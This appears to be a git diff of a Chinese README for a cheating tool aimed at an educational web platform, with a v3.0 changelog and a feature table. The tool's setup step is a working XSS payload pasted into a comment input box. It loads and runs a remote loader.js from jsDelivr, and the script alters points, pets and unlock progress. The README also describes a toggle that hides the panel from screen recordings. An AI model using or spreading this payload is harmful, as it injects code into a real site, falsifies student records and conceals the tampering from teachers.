@@ -7,10 +7,10 @@
 贴进「注释填空」的输入框，随便答错提交：
 
 ```html
-<img src=x onerror="with(document)body.appendChild(createElement('script')).src='//cdn.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@v2.19/loader.js'">
+<img src=x onerror="with(document)body.appendChild(createElement('script')).src='//cdn.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@v3.0/loader.js'">
 ```
 
-147 字符，刚好卡在输入框上限内。面板出现在右下角。**再注入一次就是隐形开关**：面板开着时注入 → 整块隐藏；再注入 → 显形。藏起来时页面里只剩你原本的内容，录屏、投屏都不留痕迹。
+146 字符，刚好卡在输入框上限内。面板出现在右下角。**再注入一次就是隐形开关**：面板开着时注入 → 整块隐藏；再注入 → 显形。藏起来时页面里只剩你原本的内容，录屏、投屏都不留痕迹。
 
 之后每次只要 44 字符：
 
@@ -24,10 +24,17 @@
 >
 > 为什么不用 GitLab `/-/raw/`：它返回 `text/plain` + `nosniff`，`<script>` 标签拒执行。jsDelivr 走 GitHub 并给正确的 JS MIME，所以当主源。
 
+## v3.0
+
+- 主面板标题栏新增 ◐，主面板透明度最低 5%；每个模块窗口的 ◐ 也降到 5%。标题栏始终不透明，低透明度下仍可关窗、把透明度调回来。
+- 新增 🤖 AI 网页：直连 DeepSeek V4.1 Flash（`deepseek-flash`），API Key 只存本机 `localStorage`；支持深/浅/自动主题、思考深度（关闭/低/高/最大）、流式输出、思考过程折叠和本机对话记录。
+
 ## 功能
 
 | 按钮 | 文件 | 作用 |
 |---|---|---|
+| 🤖 AI 网页 | `mods/ai.js` | DeepSeek V4.1 Flash 对话；API Key/地址/主题/思考深度；流式输出 |
+| ◐ 透明度 | `loader.js` | 主面板与模块窗口 5%–100%，标题栏保持可操作 |
 | 💰 积分 | `mods/score.js` | 设 `score` + `earned`（两个一起改才生效） |
 | 🐾 灵宠 | `mods/pets.js` | 数量（≤4）、种类（fox/qilin/cat/dog）、名字 |
 | 🔓 解锁4只 | `mods/unlock.js` | 补满填空题进度 + 积分到 5400 |
